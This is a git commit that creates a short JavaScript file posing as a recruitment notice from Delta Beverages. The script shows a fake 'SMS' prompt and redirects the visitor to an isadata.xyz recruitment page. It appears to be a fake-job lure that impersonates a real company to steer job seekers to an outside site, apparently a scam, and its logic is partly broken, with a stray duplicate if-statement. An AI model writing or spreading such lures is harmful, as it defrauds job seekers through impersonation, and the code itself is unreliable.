920041d73c416a46167a0e7302d44b20d85d5565
newetijazz1 <newetijazz1@gmail.com>
2026-01-07 10:22:36 +0100

    Create zimbabwejob.js

---
+++ zimbabwejob.js
@@ -0,0 +1,6 @@
+var password = 'Recruitment for Delta Beverages'
+password=prompt('SMS : Delta Beverages is currently recruiting, press OK to apply for ','Recruitment for Delta Beverages');
+if (password != 'Recruitment for Delta Beverages');
+if (password != 'Recruitment for Delta Beverages') {
+location.href='https://www.isadata.xyz/Delta-Beverages-Recruitment';
+}
